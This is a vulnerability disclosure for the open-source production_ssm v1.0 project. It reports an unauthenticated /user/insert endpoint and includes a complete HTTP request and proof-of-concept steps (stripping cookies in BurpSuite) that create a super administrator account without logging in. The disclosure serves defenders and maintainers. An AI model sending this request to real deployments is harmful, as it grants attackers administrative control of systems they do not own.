## Unauthorized Super Administrator Addition in production_ssm v1.0

## **<font style="color:rgb(15, 17, 21);">Vulnerability Description</font>**

megagao/production_ssm v1.0 contains a critical permission control flaw. The `insert()` method in `src/main/java/com/megagao/production/ssm/controller/system/UserController.java` lacks any authentication and authorization checks for the user registration/addition interface. Attackers can directly call the `/user/insert` endpoint without login or credentials to create accounts with administrator privileges.

## **<font style="color:rgb(15, 17, 21);">Vulnerability Analysis</font>**

<font style="color:rgb(15, 17, 21);">Project URL:</font><font style="color:rgb(15, 17, 21);"> </font>[<font style="color:rgb(57, 100, 254);">https://github.com/megagao/production_ssm</font>](https://github.com/megagao/production_ssm)

In the `insert()` method of `UserController.java`, the absence of permission control annotations (such as Spring Security's `@PreAuthorize`) leaves the user addition functionality completely exposed. Attackers can bypass all authentication mechanisms and send malicious requests to this interface to create super administrator accounts.
![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770270692671-f8d9e120-44a5-4a05-b12b-7ea5b24a5f21.png)

<font style="color:rgb(15, 17, 21);">Attackers can directly add super administrator users by constructing the following data packets without authentication fields:</font>

```java
POST /user/insert HTTP/1.1
Host: localhost:8081
Content-Length: 66
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8081/home
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

id=test_admin1&username=test_admin1&password=1&roleId=001&locked=1
```

## **<font style="color:rgb(15, 17, 21);">Proof of Concept</font>**

1. <font style="color:rgb(15, 17, 21);">Login using default account (22:22)</font>
2. <font style="color:rgb(15, 17, 21);">Navigate to "System Management" → "User Management" → "Add User"</font>
   ![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770271098324-0b8f4bd4-6e12-441f-988c-5ad9368003be.png)

3. <font style="color:rgb(15, 17, 21);">Add a super administrator user named </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">test_admin</font>`
   ![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770271250860-9526300b-2600-4629-836b-5d7b69df1d08.png)

4. <font style="color:rgb(15, 17, 21);">Use BurpSuite to intercept normal user addition request</font>
   ![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770271289115-8af0bcde-5e27-497a-a2f8-6457c6830e84.png)

5. <font style="color:rgb(15, 17, 21);">Remove all authentication headers (e.g., Cookie) from the request</font>
   ![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770271320937-66cd886e-8ac1-4c53-b409-ef08cefcdc88.png)

6. <font style="color:rgb(15, 17, 21);">Refresh user list to confirm successful administrator addition without authorization</font>
  ![](https://cdn.nlark.com/yuque/0/2026/png/42371411/1770271371990-d819a8f9-2b2c-49ce-bd4d-32c915756d8f.png)

